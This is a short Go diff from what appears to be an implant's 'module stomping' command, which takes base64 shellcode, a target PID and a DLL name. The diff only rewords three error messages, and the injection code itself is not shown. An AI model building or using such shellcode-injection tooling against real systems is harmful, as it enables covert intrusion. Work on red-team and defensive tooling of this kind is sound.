@@ -47,7 +47,7 @@ type moduleStompingParams struct {
 
 func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[moduleStompingParams](task)
@@ -57,11 +57,11 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil || len(shellcode) == 0 {
-		return errorResult("Error: invalid or empty shellcode data")
+		return errorResult("invalid or empty shellcode data")
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: invalid PID specified")
+		return errorResult("invalid PID specified")
 	}
 
 	if params.DllName == "" {
